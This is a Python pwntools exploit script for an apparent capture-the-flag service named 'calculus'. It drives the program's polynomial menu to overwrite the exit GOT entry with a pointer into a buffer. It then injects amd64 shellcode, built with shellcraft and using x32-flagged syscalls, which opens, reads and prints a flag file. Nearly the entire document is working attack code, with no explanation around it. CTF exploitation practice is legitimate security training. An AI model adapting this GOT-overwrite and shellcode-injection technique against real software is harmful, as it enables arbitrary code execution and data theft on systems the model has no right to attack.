#!/usr/bin/python

from pwn import *

DEBUG = True

exit_got = 0x602080
val_buf = 0x602120

'''
#p = process('./calculus')
p = remote('localhost', 4925)

'''
#con = ssh(host='plusctf.qwaz.io', user='guest', password='guest', port=22)
#p = con.remote("localhost", 10034)
#p = con.remote("localhost", 4924)


def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def set_poly(poly):
  r('>> ')
  p.sendline('0')

  r('polynomial : ')
  p.sendline(poly)

def calc(val):
  r('>> ')
  p.sendline('4')

  r('of x : ')
  p.sendline(str(val))

def unset_poly():
  r('>> ')
  p.sendline('5')
 
def exit_():
  r('>> ')
  p.sendline('6')

def push_calc(msg):
  length = len(msg)

  set_poly('-1x^100+1x^0')
  calc(1)
  unset_poly()

  for i in xrange(0, length, 4):
    val = u32(msg[i : i+4])

    if val != 0:
      set_poly('%dx^0' % val)
      calc(0)
      unset_poly()
    else:
      set_poly('1x^1')
      calc(0)
      unset_poly()

sc = pwnlib.shellcraft.amd64

payload = sc.pushstr('/home/calculus/flag')
payload += sc.syscall(2 | 0x40000000, 'rsp', 0, 0)
payload += sc.syscall(0 | 0x40000000, 'rax', 'rsp', 60)
payload += sc.syscall(1 | 0x40000000, 1, 'rsp', 60)

print payload

payload = asm(payload, os='linux', arch='amd64').rjust(0x60, '\x90')

# Overwrite exit_got
fake_value_cnt = (exit_got - val_buf) / 4
set_poly('%dx^100+1x^0' % fake_value_cnt)
unset_poly()

set_poly('%dx^0-%dx^1' % (val_buf, val_buf))
calc(0)
calc(1)
unset_poly()

push_calc(payload)

exit_()

p.interactive()
p.close()
